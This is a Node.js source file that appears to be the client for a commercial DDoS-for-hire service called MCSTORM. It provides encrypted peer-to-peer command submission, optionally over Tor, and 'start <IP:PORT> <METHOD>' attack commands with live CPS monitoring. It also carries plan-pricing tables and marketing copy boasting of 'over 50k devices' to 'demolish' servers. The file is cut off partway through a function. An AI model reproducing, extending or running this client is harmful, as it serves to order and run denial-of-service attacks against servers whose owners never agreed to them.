const { io } = require("socket.io-client");
const { SocksProxyAgent } = require('socks-proxy-agent')
const { spawn } = require('child_process');
const fs = require('fs');
const https = require('https');
const tar = require('tar-stream');
const zlib = require('node:zlib');
const crypto = require('crypto');
const colors = require('colors');
const inquirer = require('inquirer');
const Table = require('cli-table3');
const sound = require("sound-play");
const notifier = require('node-notifier');
const readline = require('readline');
const whois = require('whois')
const dns = require('dns');
const { Worker } = require('node:worker_threads');

var lastNotification = 0;

var incomingMessageLimits = {};
var outgoingMessageLimits = [
  {timespan: 10,   max: 3,   counter: 0, counterStart: 0},
  {timespan: 60,   max: 15,  counter: 0, counterStart: 0},
  {timespan: 600,  max: 80,  counter: 0, counterStart: 0},
  {timespan: 3600, max: 300, counter: 0, counterStart: 0},
]

var connected = 0;
var lastConnTry = 0;
var connType;
var username;

var keys = {
  private: null,
  public: null,
  pass: null,
  master: null
};

var knownNodes = [];
var knownKeys = [];
var sockets = [];

const nodesFile = fs.readFileSync("nodes.txt").toString().replace(/\r/g, "");
const knownNodesRaw = nodesFile.split("\n");

knownNodesRaw.forEach(nodeRaw => {
  const parts = nodeRaw.split(":");
  var node = {
    host: parts[0],
    port: parts[1],
    online: false
  };
  knownNodes.push(node);
})

var currentData = {};
var myAttacks = [];

var commandQueue = [];
var receivedMessages = [];
var contacts = [];

var history = [];
var historyIndex = 0;

var currentWindow = null;

readline.emitKeypressEvents(process.stdin);
process.stdin.setRawMode(true);

process.stdin.on('keypress', (str, key) => {

  if(currentWindow!="console") return;
  if (key.name === 'up' && historyIndex > 0) {
    historyIndex--;
    prompt.currentPrompt.rl.line= history[historyIndex]
    prompt.currentPrompt.rl.cursor= history[historyIndex].length
  } else if (key.name === 'down' && historyIndex < history.length - 1) {
    historyIndex++;
    prompt.currentPrompt.rl.line= history[historyIndex]
    prompt.currentPrompt.rl.cursor= history[historyIndex].length
  }
});

inquirer.createPromptModule = function(opt) {
  const promptModule = function(questions, answers) {
    let ui;
    try {
      ui = new inquirer.ui.Prompt(promptModule.prompts, opt);
      promptModule.currentPrompt = ui; // ADDED
    } catch (error) {
      return Promise.reject(error);
    }
    const promise = ui.run(questions, answers);

    promise.ui = ui;

    return promise;
  };

  promptModule.currentPrompt = null;
  promptModule.prompts = {};

  promptModule.registerPrompt = function(name, prompt) {
    promptModule.prompts[name] = prompt;
    return this;
  };

  promptModule.restoreDefaultPrompts = function() {
    this.registerPrompt('list',     require('./node_modules/inquirer/lib/prompts/list'));
    this.registerPrompt('input',    require('./node_modules/inquirer/lib/prompts/input'));
    this.registerPrompt('number',   require('./node_modules/inquirer/lib/prompts/number'));
    this.registerPrompt('confirm',  require('./node_modules/inquirer/lib/prompts/confirm'));
    this.registerPrompt('rawlist',  require('./node_modules/inquirer/lib/prompts/rawlist'));
    this.registerPrompt('expand',   require('./node_modules/inquirer/lib/prompts/expand'));
    this.registerPrompt('checkbox', require('./node_modules/inquirer/lib/prompts/checkbox'));
    this.registerPrompt('password', require('./node_modules/inquirer/lib/prompts/password'));
    this.registerPrompt('editor',   require('./node_modules/inquirer/lib/prompts/editor'));
  };

  promptModule.restoreDefaultPrompts();

  return promptModule;
};

var prompt = inquirer.createPromptModule({
  input: process.stdin,
  output: process.stdout,
});

console.commandLog = function(text) {
  if (prompt.currentPrompt == null) return;
  var totalLength = prompt.currentPrompt.activePrompt.rl.line.length + 4;
  var columns = Math.floor(totalLength / process.stdout.columns)
  process.stdout.write("\r\x1b[0K" + (columns > 0 ? "\x1b[" + columns + "A" : "") + text + "\x1b[0K\n")

  process.stdout.write(prompt.currentPrompt.activePrompt.opt.prefix + " " + prompt.currentPrompt.activePrompt.opt.message.bold + " " + prompt.currentPrompt.activePrompt.rl.line + "\n\x1b[A\x1b[" + totalLength + "C");
};

function limitOutgoingMessages() {
  var currentTime = new Date().getTime();
  var block = false;
  outgoingMessageLimits.forEach((limit,i,o) => {
    if(limit.counter == 0) limit.counterStart = currentTime;
    if(limit.counterStart + limit.timespan*1000 < currentTime) {
      o[i].counterStart = currentTime;
      o[i].counter = 0;
    }
    if(o[i].counter >= limit.max) block = true;
    o[i].counter++;
  })
  return block;
}

function limitIncomingMessages(sender) {
  sender = sender.toString();
  var currentTime = new Date().getTime();
  var block = false;
  if(!Object.keys(incomingMessageLimits).includes(sender)) {
    incomingMessageLimits[sender] = [
      {timespan: 10,   max: 5,   counter: 0, counterStart: 0},
      {timespan: 60,   max: 18,  counter: 0, counterStart: 0},
      {timespan: 600,  max: 90,  counter: 0, counterStart: 0},
      {timespan: 3600, max: 330, counter: 0, counterStart: 0},
    ]
  }
  incomingMessageLimits[sender].forEach((limit,i,o) => {
    if(limit.counter == 0) limit.counterStart = currentTime;
    if(limit.counterStart + limit.timespan*1000 < currentTime) {
      o[i].counterStart = currentTime;
      o[i].counter = 0;
    }
    if(o[i].counter >= limit.max) block = true;
    o[i].counter++;
  })
  return block;
}

function saveNodeList() {
  var list = [];
  knownNodes.forEach(n=>{
    list.push(n.host+":"+n.port);
  })
  var listToSave = list.join("\n");
  fs.writeFileSync('nodes.txt', listToSave);
}

function removeDuplicates(arr, prop) {
  return arr.filter((obj, index, self) => {
    return self.findIndex((t) => t[prop] === obj[prop]) === index;
  });
}

function addPotentialNode(node) {
  if(!knownNodes.find(o=> o.host === node.host)) {
    testNode(node).then(success=>{
      knownNodes.push(node);
      knownNodes = removeDuplicates(knownNodes, 'host')
      saveNodeList();
    }).catch(e=>{})
  }
  
}

function sha256(input) {
  const hash = crypto.createHash('sha256');
  hash.update(input);
  return hash.digest('hex');
}

function proofOfWork(string, difficulty) {
  return new Promise((resolve,reject)=>{
    var workers = [];
    for (var i = 0; i < require('os').cpus().length; i++) {
      const workerData = {string: string, difficulty: difficulty};
      const w = new Worker('./pow.js', { workerData });
      workers.push(w)
      w.setMaxListeners(512);
      w.on('message', (code) => {
        var hash = sha256(string+code);
        resolve({hash: hash, pow: code});
        workers.forEach(worker=>{
          worker.unref()
          worker.terminate()
        })
      })
    }
  })
}

function testNode(node) {
  return new Promise((resolve, reject)=>{
    var socket;
    if(connType=="TOR") {
      const Agent = new SocksProxyAgent('socks5://127.0.0.1:9050')
      socket = io("wss://" + node.host + ":" + node.port, {
        rejectUnauthorized: false,
        agent: Agent,
        timeout: 60000
      });
    } else {
      socket = io("wss://" + node.host + ":" + node.port, {
        rejectUnauthorized: false,
        timeout: 10000
      });
    }
    socket.on("connect", () => {
      socket.emit("getStormnetVersion");
    });

    socket.on("disconnect", () => {
      reject("disconnected")
    });

    socket.on("connect_error", (e) => {
      reject("error")
    });

    socket.on("stormnetVersion", version => {

      resolve(version)
      socket.disconnect();
    });
  })
}

function loadContacts() {
  if (!fs.existsSync("contacts.json")) {
    fs.writeFileSync("contacts.json", "[]")
  }
  var contactsFile = fs.readFileSync("contacts.json").toString();
  try {
    contacts = JSON.parse(contactsFile);
  } catch (e) {
    console.log("Malformed contacts.json file. Either fix the file or remove it (removing will also remove all your contacts)".red)
    process.exit();
    return;
  }
}

async function createEncryption(message) {
  try {
    displayBanner()
    console.log("Welcome to first use setup! Before you can begin, please create a password for encryption.")
    console.log(message);
    console.log("")
    prompt([{
          type: 'password',
          mask: true,
          name: 'password1',
          message: 'Create encryption password:'
        },
        {
          type: 'password',
          mask: true,
          name: 'password2',
          message: 'Retype encryption password:'
        },
      ])
      .then(async (answers) => {
        if (answers.password1 == answers.password2) {
          console.log("Generating keys...");
          const {
            publicKey,
            privateKey
          } = await generateRSAKeyPair(answers.password1);
          console.log("The key is now being verified. This can take anywhere from a few seconds to over a minute, depending on your processor power. Please stand by...".brightCyan);
          var {hash, pow} = await proofOfWork(publicKey, 6);
          keys.pass = answers.password1;
          console.log("Saving...")
          fs.writeFileSync('public_key.pem', publicKey);
          fs.writeFileSync('private_key.pem', privateKey);
          fs.writeFileSync('public_key_pow.txt', pow+":"+hash);
          keys.keyPow = pow;
          keys.keyHash = hash;
          const privateKeyObject = crypto.createPrivateKey({
            key: privateKey,
            format: 'pem',
            type: 'pkcs8',
            passphrase: answers.password1,
          });

          keys.private = privateKeyObject;
          keys.public = Buffer.from(publicKey);
          if (!fs.existsSync("username.txt")) {
            createUsername("Choose a username so people can see your name when you send them a message.");
            return;
          }
          return;
        }
        createEncryption("Passwords are not matching. Please try again.".yellow);
      })
      .catch((error) => {
        catchInquirerError(error);
      });
  } catch (err) {
    console.error('Error generating key pair:', err);
  }
}

function createUsername(message) {
  displayBanner()
  console.log("")
  console.log(message);
  console.log("")
  prompt([{
      type: 'input',
      name: 'username',
      message: 'Choose your username:'
    }])
    .then(async (answers) => {
      username = answers.username.match(/^[a-zA-Z0-9\-\_]+$/)[0];
      if (username.length < 3) {
        createUsername("Invalid Username".red);
        return;
      }
      fs.writeFileSync("username.txt", username);
      showMainMenu();
    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

async function initEncryption(message) {
  if (!fs.existsSync("master_public_key.pem")) {
    console.log("Master key is missing!".red)
    process.exit();
    return;
  }

  keys.master = fs.readFileSync("master_public_key.pem");

  if (!fs.existsSync("private_key.pem") || !fs.existsSync("public_key.pem")) {
    createEncryption("Warning! ".yellow + "Password cannot be recovered nor changed. If you lose your password, it can be " + "never recovered".underline.red)
    return;
  }

  var encryptedPrivateKeyPem = fs.readFileSync("private_key.pem");
  keys.public = fs.readFileSync("public_key.pem");

  displayBanner()
  console.log("")
  console.log(message);
  console.log("")
  prompt([{
      type: 'password',
      mask: true,
      name: 'password',
      message: 'Enter decryption password:'
    }])
    .then(async (answers) => {
      try {
        const privateKey = crypto.createPrivateKey({
          key: encryptedPrivateKeyPem,
          format: 'pem',
          type: 'pkcs8',
          passphrase: answers.password,
        });

        keys.private = privateKey;
        keys.pass = answers.password;

        loadContacts()
        
        if (!fs.existsSync("public_key_pow.txt")) {
          console.log("Your key is now being verified. This can take anywhere from a few seconds to over a minute, depending on your processor power. Please stand by...".brightCyan);
          var {hash, pow} = await proofOfWork(keys.public.toString(), 6);
          fs.writeFileSync('public_key_pow.txt', pow+":"+hash);
          keys.keyPow = pow;
          keys.keyHash = hash;
        } else {
          var keyPowFile = fs.readFileSync("public_key_pow.txt").toString().split(":");
          keys.keyPow = parseInt(keyPowFile[0]);
          keys.keyHash = keyPowFile[1];
        }
        if (!fs.existsSync("username.txt")) {
          createUsername("Choose a username so people can see your name when you send them a message.");
          return;
        }
        username = fs.readFileSync("username.txt").toString().match(/^[a-zA-Z0-9\-\_]+$/)[0];
        if (username.length < 3) {
          console.log("Invalid Username".red);
          process.exit();
          return;
        }
        showMainMenu();
      } catch (e) {
        initEncryption("The password is incorrect. Please try again.".yellow + "\n" + "If you have lost your password, you need to remove the `" + "private_key.pem".yellow + "` and `" + "public_key.pem".yellow + "` files.\n" + "This will also cause you to lose your plan and other user information.".red);
      }
      return;
    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function generateRSAKeyPair(passphrase) {
  return new Promise((resolve, reject) => {
    crypto.generateKeyPair('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs8',
        format: 'pem',
        cipher: 'aes-256-cbc',
        passphrase: passphrase
      }
    }, (err, publicKey, privateKey) => {
      if (err) {
        reject(err);
        return;
      }
      resolve({
        publicKey,
        privateKey
      });
    });
  });
}

function encryptStoredMessage(text, password) {
  const salt = crypto.randomBytes(16);
  const key = crypto.scryptSync(password, salt, 32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
  return {
    salt: salt.toString('hex'),
    iv: iv.toString('hex'),
    encrypted: encrypted.toString('hex'),
  };
}

function decryptStoredMessage(message, password) {
  var parsedMessage = JSON.parse(message);
  const salt = Buffer.from(parsedMessage.salt, 'hex')
  const iv = Buffer.from(parsedMessage.iv, 'hex')
  const text = Buffer.from(parsedMessage.encrypted, 'hex')
  const key = crypto.scryptSync(password, salt, 32);
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  let decrypted = Buffer.concat([decipher.update(text), decipher.final()]);
  return decrypted;
}

function encryptData(data) {
  const iv = crypto.randomBytes(16);
  const key = crypto.randomBytes(32);

  const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
  const encryptedData = Buffer.concat([cipher.update(data), cipher.final()]);

  return {
    encryptedData: encryptedData,
    key: Buffer.concat([iv, key])
  };
}

function decryptData(fullkey, data) {
  const iv = fullkey.slice(0, 16);
  const key = fullkey.slice(16, 48);

  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  const decryptedData = Buffer.concat([decipher.update(data), decipher.final()]);

  return decryptedData;
}

async function encryptMessage(message, useMaster) {
  var encryptedMessage = encryptData(message);
  var encryptedKey = crypto.privateEncrypt(keys.private, encryptedMessage.key);
  if (useMaster) encryptedKey = crypto.publicEncrypt(keys.master, encryptedKey);
  encrypted = {
    messageId: generateMessageId(),
    encryptedMessage: encryptedMessage.encryptedData,
    encryptedKey: encryptedKey,
    publicKey: keys.public
  }
  var {hash, pow} = await proofOfWork(JSON.stringify(encrypted), 4);
  encrypted.hash = hash;
  encrypted.pow = pow;
  encrypted.keyPow = keys.keyPow;
  encrypted.keyHash = keys.keyHash;

  return encrypted;
}

function signMessage(message) {
  const sign = crypto.createSign('RSA-SHA256');
  sign.update(message);
  const signature = sign.sign(keys.private);
  return signature;
}

function verifySignature(message, signature, publicKey) {
  const verify = crypto.createVerify('RSA-SHA256');
  verify.update(message);
  const signatureBuffer = Buffer.from(signature, 'hex')
  const isVerified = verify.verify(publicKey, signature, 'hex');
  return isVerified;
}

async function encryptDirectMessage(message, recipientKey) {
  var sign = signMessage(message).toString('hex');
  var messageToEncrypt = {message: message, signature: sign}
  var encryptedMessage = encryptData(JSON.stringify(messageToEncrypt));
  var encryptedKey = crypto.publicEncrypt(Buffer.from(recipientKey, 'hex'), encryptedMessage.key);
  encrypted = {
    messageId: generateMessageId(),
    encryptedMessage: encryptedMessage.encryptedData,
    encryptedKey: encryptedKey,
    publicKey: keys.public
  }
  var {hash, pow} = await proofOfWork(JSON.stringify(encrypted), 4);
  encrypted.hash = hash;
  encrypted.pow = pow;
  encrypted.keyPow = keys.keyPow;
  encrypted.keyHash = keys.keyHash;
  return encrypted;
}

function getUserToken(publicKey) {
  return publicKey.slice(128, 128 + 16).toString("hex")
}

function colorizeCPS(cps) {
  if(cps<100) return cps;
  if(cps>=100&&cps<500) return cps.toString().brightGreen
  if(cps>=500&&cps<1500) return cps.toString().brightYellow
  if(cps>=1500&&cps<2500) return cps.toString().yellow
  if(cps>=2500&&cps<3500) return cps.toString().brightRed
  return cps.toString().red
}

function bufferArrayIncludes(bufferArray, targetBuffer) {
  return bufferArray.some(buf => Buffer.compare(buf, targetBuffer) === 0);
}

function decryptMessage(message) {

  if (!bufferArrayIncludes(knownKeys, message.publicKey)) knownKeys.push(message.publicKey);

  if (message.publicKey.equals(keys.master)) {
    // from master
    try {
      var decryptedKey = crypto.publicDecrypt(keys.master, message.encryptedKey);
      var decryptedMessage = null;

      try {
        // public master message
        decryptedMessage = decryptData(decryptedKey, message.encryptedMessage);
      } catch(e) {
        // private master message
        decryptedKey = crypto.privateDecrypt(keys.private, decryptedKey);
        decryptedMessage = decryptData(decryptedKey, message.encryptedMessage);
      }
      var parsedMessage = JSON.parse(decryptedMessage.toString());
      if(parsedMessage.t == "i") {
        currentData = parsedMessage.d;
        myAttacks.forEach((a,i,o)=>{
          if(Date.now()<a.endTime) {
            currentData.n.forEach(n=>{
              if(a.servers.includes(n.s)) {
                if (currentWindow == "console") console.commandLog("CPS: "+colorizeCPS(n.c5)+" | Responses: "+colorizeCPS(n.c3));
              }
            })
            
          } else {
            if (currentWindow == "console") console.commandLog("Attack ended.".yellow);
            o.splice(i,1);
          }
        })
      }
      if(parsedMessage.t == "attack") {
        var data = parsedMessage.d
        var endTime = Date.now()+1000*data.time
        myAttacks.push({servers: data.servers, stormcode: data.stormcode, endTime: endTime})
        if (currentWindow == "console") console.commandLog(("Attack starting using "+data.servers.join(", ")).green);
      }
      if(parsedMessage.t == "attack_error") {
        var data = parsedMessage.d
        if (currentWindow == "console") {
          console.commandLog(("Could not start attack: "+data).red);
          switch(data) {
          case "invalid_syntax":
            console.commandLog(("Usage: start <IP:PORT> <METHOD> <NETWORK> <SECONDS> [PROTOCOL]"));
            break;
          case "not_registered":
            console.commandLog(("You have to purchase a plan before running attacks"));
            break;
          case "free_over_limit":
            console.commandLog(("You have used all your free attacks"));
            break;
          case "invalid_method":
            console.commandLog(("The method is not valid. Use `"+"methods".yellow+"` to see available methods"));
            break;
          case "invalid_network":
            console.commandLog(("The network is not valid. Use `"+"networks".yellow+"` to see available netowrks"));
            break;
          case "invalid_time":
            console.commandLog(("The time is either not valid or your plan does not allow such long attacks"));
            break;
          case "too_many_concurrent":
            console.commandLog(("Your plan does not allow co many concurrent attacks"));
            break;
          case "servers_unavailable":
            console.commandLog(("All slots are full. Please try again later."));
            break;
          }
        }
      }
      if(parsedMessage.t == "stop_error") {
        var data = parsedMessage.d
        if (currentWindow == "console") console.commandLog(("Could not stop attack: "+data).red);
      }
      if(parsedMessage.t == "stop") {
        var data = parsedMessage.d
        if (currentWindow == "console") console.commandLog(("Successfully stopped attacks: "+data).green);
        myAttacks = [];
      }
      //
      return decryptedMessage
    } catch (e) {
      return false;
    }
  }

  // public message from different client
  try {
    var decryptedKey = crypto.publicDecrypt(message.publicKey, message.encryptedKey);
    var decryptedMessage = decryptData(decryptedKey, message.encryptedMessage);
    var parsedMessage = JSON.parse(decryptedMessage.toString())
    if(parsedMessage.token!=undefined) {

      if(limitIncomingMessages(message.publicKey)) return;

      parsedMessage.token = getUserToken(message.publicKey);
      decryptedMessage = JSON.stringify(parsedMessage)
      if (!fs.existsSync("./chatHistories/community")) {
        fs.mkdirSync("./chatHistories/community")
      }
      if (!fs.existsSync("./chatHistories/community/history")) {
        fs.writeFileSync("./chatHistories/community/history", "")
      }
      if (!fs.existsSync("./chatHistories/community/messages")) {
        fs.mkdirSync("./chatHistories/community/messages")
      }
      fs.writeFileSync("./chatHistories/community/messages/" + message.messageId + ".json", JSON.stringify(encryptStoredMessage(decryptedMessage.toString(), keys.pass)));
      fs.appendFileSync("./chatHistories/community/history", message.messageId + "\n")
      if (currentWindow == "community") {
        console.commandLog("[" + getUserToken(message.publicKey).slice(0, 8) + "...] " + parsedMessage.username + " > " + parsedMessage.message)
        if(process.platform=="win32") sound.play(__dirname + './sounds/communityMessage.wav');
      }  
    }
    if(parsedMessage.knownNode!=undefined) {
      addPotentialNode(parsedMessage.knownNode)

    }
    
    return decryptedMessage
  } catch (e) {
    //return false;
  }

  // private message from different client
  try {
    var decryptedKey = crypto.privateDecrypt(keys.private, message.encryptedKey);
    var decryptedMessage = decryptData(decryptedKey, message.encryptedMessage);
    var userToken = getUserToken(message.publicKey);
    var parsedMessage = JSON.parse(decryptedMessage.toString())

    if (!verifySignature(parsedMessage.message, parsedMessage.signature, message.publicKey)) return;
    
    finalMessage = JSON.parse(parsedMessage.message);

    if (!updateContact(userToken, finalMessage.username)) return;

    if (finalMessage.message == "") return;

    if (!fs.existsSync("./chatHistories/" + userToken)) {
      fs.mkdirSync("./chatHistories/" + userToken)
    }
    if (!fs.existsSync("./chatHistories/" + userToken + "/history")) {
      fs.writeFileSync("./chatHistories/" + userToken + "/history", "")
    }
    if (!fs.existsSync("./chatHistories/" + userToken + "/messages")) {
      fs.mkdirSync("./chatHistories/" + userToken + "/messages")
    }

    fs.writeFileSync("./chatHistories/" + userToken + "/messages/" + message.messageId + ".json", JSON.stringify(encryptStoredMessage(parsedMessage.message, keys.pass)));
    fs.appendFileSync("./chatHistories/" + userToken + "/history", message.messageId + "\n")

    if(process.platform=="win32") sound.play(__dirname + './sounds/directMessage.wav');
    if (lastNotification < Date.now() - 7000 && process.platform=="win32") {
      lastNotification = Date.now();
      notifier.notify({
        title: finalMessage.username,
        message: finalMessage.message,
        sound: false,
        appID: "MCSTORM Direct Message "+message.messageId,
        icon: __dirname + './image/logo.png'
      });
    }

    const date = new Date(finalMessage.time);
    const dateString = date.toLocaleDateString();
    const timeString = date.toLocaleTimeString();

    if (currentWindow == "DM" + userToken) console.commandLog("[DM] ".green + ("[" + dateString + " " + timeString + "]").brightBlue + " [" + userToken.slice(0, 8) + "...] " + finalMessage.username + " > " + finalMessage.message)
    return decryptedMessage
  } catch (e) {
    return false;
  }

}

function generateMessageId() {
  return Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
}

async function sendCommand(args) {
  if(connected==0) {
    console.log("You are not connected to any nodes. Please try again in a few seconds or verify content of nodes.txt".red)
    return;
  }
  process.stdout.write("Generating payload...")
  var message = await encryptMessage(JSON.stringify(args), true);
  process.stdout.write("\r\x1b[0K");

  commandQueue.push(message);
}

function sendDirectMessage(message, recipientKey) {
  var localId = generateMessageId();
  fs.writeFileSync("./chatHistories/" + getUserToken(Buffer.from(recipientKey, 'hex')) + "/messages/" + localId + ".json", JSON.stringify(encryptStoredMessage(message, keys.pass)));
  fs.appendFileSync("./chatHistories/" + getUserToken(Buffer.from(recipientKey, 'hex')) + "/history", localId + "\n")
  process.stdout.write("Generating payload...")
  var message = encryptDirectMessage(message, recipientKey);
  process.stdout.write("\r\x1b[0K");
  commandQueue.push(message);
}

async function sendCommunityMessage(message) {
  var localId = generateMessageId();
  fs.writeFileSync("./chatHistories/community/messages/" + localId + ".json", JSON.stringify(encryptStoredMessage(message, keys.pass)));
  fs.appendFileSync("./chatHistories/community/history", localId + "\n")
  process.stdout.write("Generating payload...")
  var message = await encryptMessage(message, false);
  process.stdout.write("\r\x1b[0K");
  commandQueue.push(message);
}

function runWhois(parts) {
  whois.lookup(parts[1], function(err, data) {
    if (currentWindow == "console") console.commandLog(data)
  })
}

function runDNS(parts) {
  dns.resolve4(parts[1], function(err, address, family) {
    if (currentWindow == "console") console.commandLog(address)
  })
}

function runDNSMC(parts) {

  var host = "_minecraft._tcp."+parts[1];
  dns.resolveSrv(host, function(err, addresses) {
    if(err) {
      if (currentWindow == "console") console.commandLog("Cannot resolve "+host)
      return;
    }
    addresses.forEach(address=>{
      if (currentWindow == "console") console.commandLog(address.name+":"+address.port)
    })
  })
  
}

async function processCommand(command) {
  history.push(command)
  historyIndex = history.length;
  commandParts = command.split(" ");
  switch (commandParts[0]) {
    case "exit":
      return false;
    case "clear":
      displayBanner();
      break;
    case "help":
      showHelp();
      break;
    case "methods":
      console.log(currentData.methods);
      break;
    case "networks":
      console.log(currentData.networks);
      break;
    case "protocols":
      console.log(currentData.protocols);
      break;
    case "dns":
      runDNS(commandParts);
      break;
    case "mcdns":
      runDNSMC(commandParts);
      break;
    case "whois":
      runWhois(commandParts);
      break;
    case "stop":
    case "start":
    case "redeem":
      await sendCommand(commandParts);
      break;
    case "addnode":
      addNode(commandParts);
      break;
    default:
      console.log("Unknown command: ".red + command)
  }
  return true;
}

function processDirectMessage(message, recipientKey) {
  if (message == "exit") return false
  var messageToSend = JSON.stringify({
    message: message,
    username: username,
    time: Date.now()
  })
  sendDirectMessage(messageToSend, recipientKey);
  return true;
}

function processCommunityMessage(message) {
  if (message == "exit") return false
  if (message == "token") {
    console.log("Your user token: " + getUserToken(keys.public))
    return true;
  }
  if (message == "") {
    console.log("Message was not send: message is empty".red)
    return true;
  }
  if (message.length > 256) {
    console.log("Message was not send: message too long".red)
    return true;
  }
  if(limitOutgoingMessages()) {
    console.log("Message was not send: ratelimited".red)
    return true;
  }
  var messageToSend = JSON.stringify({
    message: message,
    username: username,
    token: getUserToken(keys.public)
  })
  sendCommunityMessage(messageToSend);
  return true;
}

function showHelp() {
  try {
    console.log(fs.readFileSync("help.txt").toString());
  } catch (e) {
    console.log("Help file is missing".red)
  }
}

function buyPlans() {
  try {
    
    var names = ["Feature"];
    var concurrents = ["Concurrents"];
    var cps = ["CPS (Sockets)"];
    var cps2 = ["CPS Peak (Sockets)"];
    var rps = ["RPS (Requests)"];
    var tls = ["TLSv1"];
    var tls2 = ["TLSv2"];
    var l4a = ["L4 AMP"];
    var l4p = ["L4 TCP"];
    var ips = ["IP Pool"];
    var times = ["Attack time"];
    var daytimes = ["Total time per day"];
    var networks = ["Network"];
    var prices = ["Price"];
    currentData.p.forEach(p=>{
      if(p.c==0) return;
      names.push(p.t)
      concurrents.push(p.c)
      cps.push((p.s*p.c).toLocaleString('en-US')+"/s")
      cps2.push((p.s*2*p.c).toLocaleString('en-US')+"/s")
      rps.push((p.r*p.c).toLocaleString('en-US')+"/s")
      tls.push((p.t1*p.c).toLocaleString('en-US')+"/s")
      tls2.push((p.t2*p.c).toLocaleString('en-US')+"/s")
      l4a.push((p.l4a*p.c).toLocaleString('en-US')+" Gbps")
      l4p.push((p.l4p*p.c).toLocaleString('en-US')+" pps")
      ips.push(p.i.toLocaleString('en-US')+"x IPv4")
      times.push(p.l.toLocaleString('en-US')+" s")
      daytimes.push(p.dl+" h")
      networks.push(p.n)
      prices.push(p.p+"€ / Month")
      
    })
    var table = new Table({
      head: names
    });
    table.push(concurrents)
    table.push(cps)
    table.push(cps2)
    table.push(rps)
    table.push(tls)
    table.push(tls2)
    table.push(l4a)
    table.push(l4p)
    table.push(ips)
    table.push(times)
    table.push(daytimes)
    table.push(networks)
    table.push(prices)
    console.log(table.toString());
    console.log("*".red +" Time per day states how long can you attack in total per day. You can start unlimited number attacks.");
    console.log("");
    console.log("Rain and Storm ARE powerful (more powerful than any other stresser plans at this price) and can down a lot of servers, but the true power of MCSTORM is unleashed with the ALPHA network. The enormous power of up to 200k sockets per second per concurrent coming from over 50k devices demolishes even the most powerful servers.");
    console.log("");
    console.log("Power Proof: "+currentData.power);
    console.log("Buy plans at "+currentData.buy);
    console.log("");
    backToMainMenu()
    return;
  } catch (e) {
    console.log("Could not get plan information. Please wait a few seconds before trying again.".red)
    backToMainMenu()
    return;
  }
}
function buyPrivatePlans() {
  try {
    
    var names = ["Feature"];
    var cps = ["CPS (Sockets)"];
    var cps2 = ["CPS Peak (Sockets)"];
    var rps = ["RPS (Requests)"];
    var tls = ["TLSv1"];
    var tls2 = ["TLSv2"];
    var l4a = ["L4 AMP"];
    var l4p = ["L4 TCP"];
    var ips = ["IP Pool"];
    var networks = ["Network"];
    var prices = ["Price"];
    currentData.p.forEach(p=>{
      if(p.c!=0) return;
      names.push(p.t)
      cps.push(p.s.toLocaleString('en-US')+"/s per slot")
      cps2.push((p.s*2).toLocaleString('en-US')+"/s per slot")
      rps.push(p.r.toLocaleString('en-US')+"/s per slot")
      tls.push(p.t1.toLocaleString('en-US')+"/s per slot")
      tls2.push(p.t2.toLocaleString('en-US')+"/s per slot")
      l4a.push(p.l4a.toLocaleString('en-US')+" Gbps per slot")
      l4p.push(p.l4p.toLocaleString('en-US')+" pps per slot")
      ips.push(p.i.toLocaleString('en-US')+"x IPv4")
      networks.push(p.n)
      prices.push(p.p+"€ / Month per slot")
      
    })
    var table = new Table({
      head: names
    });
    table.push(cps)
    table.push(cps2)
    table.push(rps)
    table.push(tls)
    table.push(tls2)
    table.push(l4a)
    table.push(l4p)
    table.push(ips)
    table.push(networks)
    table.push(prices)
    console.log(table.toString());
    console.log("*".red +" All private plans have dedicated slots and can attack 24/7 without any restrictions.");
    console.log("");
    console.log("Buy plans at "+currentData.buy);
    console.log("");
    backToMainMenu()
    return;
  } catch (e) {
    console.log("Could not get plan information. Please wait a few seconds before trying again.".red)
    backToMainMenu()
    return;
  }
}

function openConsole(showHelp = false) {
  currentWindow = "console";
  if (showHelp) {
    console.log("")
    console.log("Type `" + "help".yellow + "` to display available commands.")
    console.log("Type `" + "exit".yellow + "` to return to main menu.")
    console.log("")
  }

  prompt([{
      type: 'input',
      name: 'command',
      message: '>',
    }])
    .then(async (answers) => {
      if (await processCommand(answers.command)) {
        openConsole();
      } else {
        prompt.currentPrompt = null;
        showMainMenu();
      }

    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function openCommunityChat(showHelp = false) {
  currentWindow = "community";
  if (showHelp) {
    console.log("")
    console.log("Type `" + "exit".yellow + "` to return to main menu.")
    console.log("")
    if (!fs.existsSync("./chatHistories")) {
      fs.mkdirSync("./chatHistories")
    }
    if (!fs.existsSync("./chatHistories/community")) {
      fs.mkdirSync("./chatHistories/community")
    }
    if (!fs.existsSync("./chatHistories/community/history")) {
      fs.writeFileSync("./chatHistories/community/history", "")
    }
    if (!fs.existsSync("./chatHistories/community/messages")) {
      fs.mkdirSync("./chatHistories/community/messages")
    }
    var decryptedMessages = [];
    console.log("Decrypting messages...")
    fs.readFileSync("./chatHistories/community/history").toString().replace(/\r/g, "").split("\n").slice(-50).forEach(file => {
      if (file == "") return;
      var decrypted = JSON.parse(decryptStoredMessage(fs.readFileSync("./chatHistories/community/messages/" + file + ".json"), keys.pass).toString());
      decryptedMessages.push("[" + decrypted.token.slice(0, 8) + "...] " + decrypted.username + " > " + decrypted.message)
    });
    decryptedMessages.forEach(message => {
      console.log(message)
    })
  }
  prompt([{
      type: 'input',
      name: 'message',
      message: '>',
      prefix: '['+getUserToken(keys.public).slice(0,8)+'...] '+username
    }])
    .then((answers) => {
      if (processCommunityMessage(answers.message)) {
        openCommunityChat();
      } else {
        prompt.currentPrompt = null;
        showMainMenu();
      }

    })
    .catch((error) => {
      catchInquirerError(error);
    });
}

function updateContact(token, username) {
  var updated = false;

  contacts.forEach((c, i, o) => {
    if (c.token == token) {
      o[i].username = username;
      updated = true;
    }
  })
  if (updated) {
    fs.writeFileSync("contacts.json", JSON.stringify(contacts));
    return true;
  }
  return false;
}

function newContact(message) {

  displayBanner();
  currentWindow = "newContact";
  if (showHelp) {
